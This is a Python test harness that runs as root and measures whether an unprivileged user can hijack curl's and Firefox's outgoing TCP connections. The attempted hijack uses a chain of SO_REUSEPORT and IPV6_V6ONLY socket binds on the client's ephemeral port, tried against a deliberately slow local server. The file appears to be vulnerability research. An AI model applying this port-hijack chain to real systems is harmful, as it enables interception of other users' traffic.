#!/usr/bin/env python3
"""Can an unprivileged user take over the replies to someone else's
outgoing connection?

The services in attack.py are attacked on the port they listen on. A client
has no listening port: it gets an ephemeral one from the kernel when it
connects. This asks whether the same bug reaches that port, and whether
holding it is enough to receive the server's replies.

  usage: outgoing.py OUTDIR [CLIENT...]        (as root)

A server answers slowly, so each connection stays established long enough
to be attacked. The clients are curl and Firefox, both exactly as they come.
While they fetch, the attacker (running as nobody) watches /proc/net/tcp for
their connections and, for each one, tries in order:

  control   bind the client's local port on its own          (must be refused)
  seed      bind a socket that does not overlap the client   (the summary)
  hijack    bind one that does overlap it                    (the bug)
  takeover  connect to the client's own peer from it         (the same
                                                              four-tuple)

Only a takeover puts the attacker in the path of the replies. Writes
OUTDIR/outgoing.txt.
"""

import errno
import os
import pwd
import socket
import subprocess
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import services                                            # noqa: E402

SO_REUSEPORT = getattr(socket, "SO_REUSEPORT", 15)
NOBODY = pwd.getpwnam("nobody")
SERVER_PORT = 19500
BODY = b"SERVER-REPLY-" + b"x" * 2000
HOLD = 3.0


def errname(e):
    return errno.errorcode.get(e.errno, str(e.errno))


class SlowServer:
    """Answers in two parts with a pause between, so the connection stays
    established while the attacker works on it."""

    def __init__(self, port):
        self.sock = socket.socket()
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("127.0.0.1", port))
        self.sock.listen(64)
        self.sock.settimeout(0.3)
        self.running = True
        self.thread = threading.Thread(target=self.loop, daemon=True)
        self.thread.start()

    def loop(self):
        while self.running:
            try:
                conn, _ = self.sock.accept()
            except OSError:
                continue
            threading.Thread(target=self.serve, args=(conn,),
                             daemon=True).start()

    def serve(self, conn):
        try:
            conn.settimeout(HOLD + 5)
            conn.recv(1000)
            conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\n"
                         b"Connection: close\r\n\r\n" % len(BODY))
            time.sleep(HOLD)
            conn.sendall(BODY)
        except OSError:
            pass
        finally:
            conn.close()

    def stop(self):
        self.running = False
        self.thread.join(2)
        self.sock.close()


def established(server_port):
    """The client side of connections to the server: (local, remote)."""
    out = []
    try:
        with open("/proc/net/tcp") as f:
            next(f)
            for line in f:
                col = line.split()
                if col[3] != "01":                  # TCP_ESTABLISHED
                    continue
                la, lp = col[1].rsplit(":", 1)
                ra, rp = col[2].rsplit(":", 1)
                if int(rp, 16) == server_port and int(lp, 16) != server_port:
                    out.append((services.hexaddr(la), int(lp, 16),
                                services.hexaddr(ra), server_port))
    except OSError:
        pass
    return out


def attack(local_addr, local_port, peer_addr, peer_port):
    """The chain against one outgoing connection. Returns a result line."""
    steps = []

    control = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    control.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
    control.setsockopt(socket.SOL_SOCKET, SO_REUSEPORT, 1)
    try:
        control.bind(("::", local_port))
        steps.append("control=admitted")
    except OSError as e:
        steps.append("control=%s" % errname(e))
    control.close()

    seed = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    seed.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 1)
    seed.setsockopt(socket.SOL_SOCKET, SO_REUSEPORT, 1)
    try:
        seed.bind(("::", local_port))
        steps.append("seed=ok")
    except OSError as e:
        seed.close()
        return " ".join(steps + ["seed=%s" % errname(e),
                                 "hijack=not_attempted",
                                 "takeover=not_attempted", "stolen=0"])

    hijack = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    hijack.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
    hijack.setsockopt(socket.SOL_SOCKET, SO_REUSEPORT, 1)
    try:
        hijack.bind(("::", local_port))
        steps.append("hijack=ok")
    except OSError as e:
        hijack.close()
        seed.close()
        return " ".join(steps + ["hijack=%s" % errname(e),
                                 "takeover=not_attempted", "stolen=0"])

    stolen = 0
    try:
        hijack.settimeout(2)
        hijack.connect(("::ffff:" + peer_addr, peer_port))
        steps.append("takeover=ok")
        try:
            stolen = len(hijack.recv(4000))
        except OSError:
            pass
    except OSError as e:
        steps.append("takeover=%s" % errname(e))
        # Holding the port is the other way the attacker might see the
        # replies: listen on it and take whatever the kernel delivers while
        # the client's transfer is still running.
        listened = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        listened.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
        listened.setsockopt(socket.SOL_SOCKET, SO_REUSEPORT, 1)
        try:
            listened.bind(("::", local_port))
            listened.listen(8)
            listened.settimeout(HOLD + 1)
            conn, _ = listened.accept()
            conn.settimeout(1)
            stolen = len(conn.recv(4000))
            conn.close()
            steps.append("listen=accepted")
        except socket.timeout:
            steps.append("listen=nothing_arrived")
        except OSError as e:
            steps.append("listen=%s" % errname(e))
        listened.close()
    hijack.close()
    seed.close()
    return " ".join(steps + ["stolen=%d" % stolen])


def attacker(server_port, rfd, wfd):
    os.setgroups([])
    os.setgid(NOBODY.pw_gid)
    os.setuid(NOBODY.pw_uid)
    out = os.fdopen(wfd, "w")
    os.set_blocking(rfd, False)

    seen = set()
    while True:
        for conn in established(server_port):
            if conn in seen:
                continue
            seen.add(conn)
            out.write("attempt %s\n" % attack(*conn))
            out.flush()
        try:
            if os.read(rfd, 1) == b"":   # the parent closed the pipe
                break
        except BlockingIOError:
            pass
        time.sleep(0.05)
    out.write("attempts %d\n" % len(seen))
    out.flush()
    os._exit(0)


def run_curl(port, times):
    ok = 0
    for _ in range(times):
        rc = subprocess.run(
            ["curl", "-s", "--max-time", str(HOLD + 7),
             "http://127.0.0.1:%d/" % port], capture_output=True)
        if rc.returncode == 0 and BODY[:13] in rc.stdout:
            ok += 1
    return "curl fetches %d/%d complete" % (ok, times)


FFROOT = "/opt/ffroot"


def run_firefox(port, times):
    """Firefox as it comes, from the image 2-reachability browses with. It
    runs in a chroot of that image so it has its own libraries; its sockets
    are the host's, which is all this test is about."""
    for args in (["mount", "-t", "proc", "proc", FFROOT + "/proc"],
                 ["mount", "-t", "tmpfs", "tmpfs", FFROOT + "/tmp"],
                 ["mount", "--bind", "/dev", FFROOT + "/dev"]):
        subprocess.run(args, capture_output=True)
    ok = 0
    for _ in range(times):
        rc = subprocess.run(
            ["chroot", FFROOT, "/bin/sh", "-c",
             "cd /tmp && HOME=/tmp timeout 90 firefox-esr --headless "
             "--screenshot /tmp/page.png http://127.0.0.1:%d/ "
             "> /dev/null 2>&1; test -s /tmp/page.png" % port],
            capture_output=True, timeout=150)
        ok += rc.returncode == 0
    for d in ("/dev", "/tmp", "/proc"):
        subprocess.run(["umount", FFROOT + d], capture_output=True)
    return "firefox pages %d/%d loaded" % (ok, times)


CLIENTS = {"curl": (run_curl, 6), "firefox": (run_firefox, 2)}


def main():
    if os.getuid() != 0:
        sys.exit("run as root")
    outdir = sys.argv[1]
    wanted = sys.argv[2:] or list(CLIENTS)
    os.makedirs(outdir, exist_ok=True)
    services.setup_addresses()

    lines = ["kernel %s" % os.uname().release]
    for name in wanted:
        run, times = CLIENTS[name]
        port = SERVER_PORT + list(CLIENTS).index(name)
        server = SlowServer(port)
        r1, w1 = os.pipe()
        r2, w2 = os.pipe()
        pid = os.fork()
        if pid == 0:
            os.close(w1)
            os.close(r2)
            attacker(port, r1, w2)
        os.close(r1)
        os.close(w2)
        stop, from_child = os.fdopen(w1, "w"), os.fdopen(r2)

        client = run(port, times)
        stop.close()
        got = [line.rstrip("\n") for line in from_child]
        os.waitpid(pid, 0)
        server.stop()

        lines.append("")
        lines.append("client %s: %s" % (name, client))
        for line in got:
            lines.append("  " + line)
        print("\n".join(lines[-len(got) - 2:]))
    with open(os.path.join(outdir, "outgoing.txt"), "w") as f:
        f.write("\n".join(lines) + "\n")


if __name__ == "__main__":
    main()
